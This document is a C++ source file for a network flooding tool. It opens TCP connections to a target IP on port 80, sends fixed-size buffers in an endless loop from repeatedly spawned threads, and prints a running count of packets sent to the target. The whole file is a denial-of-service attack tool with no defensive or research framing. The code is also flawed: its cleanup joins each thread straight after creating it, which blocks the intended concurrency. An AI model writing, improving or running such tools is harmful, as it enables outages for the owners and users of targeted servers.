#include <iostream>
#include <thread>
#include <vector>
#include <cstring>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <cerrno>
#include <memory>
#include <algorithm> // Required for std::remove_if
#include <atomic>

std::atomic<int> packetsSent(0); // Counter for packets sent

void connectAndSend(const std::string &target, int port, int size) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        std::cerr << "[Error] Failed to create socket. Error: " << strerror(errno) << std::endl;
        return;
    }

    sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);

    if (inet_pton(AF_INET, target.c_str(), &server_addr.sin_addr) <= 0) {
        std::cerr << "[Error] Invalid address: " << target << ". Error: " << strerror(errno) << std::endl;
        close(sock);
        return;
    }

    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        std::cerr << "[Error] Connection failed to " << target << " on port " << port << ". Error: " << strerror(errno) << std::endl;
        close(sock);
        return;
    } else {
        std::cout << "[Info] Successfully connected to " << target << " on port " << port << std::endl;
    }

    std::unique_ptr<char[]> data(new char[size]);
    memset(data.get(), 'X', size); // Fill data with 'X'

    while (true) {
        ssize_t bytesSent = send(sock, data.get(), size, 0);
        if (bytesSent < 0) {
            std::cerr << "[Error] Failed to send data. Error: " << strerror(errno) << std::endl;
            break;
        } else if (bytesSent > 0) {
            packetsSent++;
        }
    }

    close(sock);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        std::cerr << "Usage: " << argv[0] << " -t <target_ip> -s <size_in_kb>" << std::endl;
        return 1;
    }

    std::string target;
    int size = 0;

    for (int i = 1; i < argc; i += 2) {
        std::string arg = argv[i];
        if (arg == "-t") {
            target = argv[i + 1];
        } else if (arg == "-s") {
            size = std::stoi(argv[i + 1]) * 1024; // Convert KB to bytes
        } else {
            std::cerr << "Unknown parameter: " << arg << std::endl;
            return 1;
        }
    }

    if (target.empty() || size <= 0) {
        std::cerr << "Invalid parameters." << std::endl;
        return 1;
    }

    const int port = 80; // Standard HTTP port
    std::vector<std::thread> threads;

    // Start a thread to display progress
    std::thread progressThread([&]() {
        while (true) {
            std::cout << packetsSent << " packets sent to " << target << std::endl;
            std::this_thread::sleep_for(std::chrono::seconds(1));
        }
    });

    while (true) {
        try {
            threads.emplace_back(connectAndSend, target, port, size);
        } catch (const std::system_error &e) {
            std::cerr << "[Error] Could not create more threads: " << e.what() << std::endl;
            break;
        }

        // Clean up finished threads to avoid excessive resource usage
        threads.erase(std::remove_if(threads.begin(), threads.end(), [](std::thread &t) {
            if (t.joinable()) {
                t.join();
                return true;
            }
            return false;
        }), threads.end());
    }

    for (auto &t : threads) {
        if (t.joinable()) {
            t.join();
        }
    }

    if (progressThread.joinable()) {
        progressThread.join();
    }

    return 0;
}
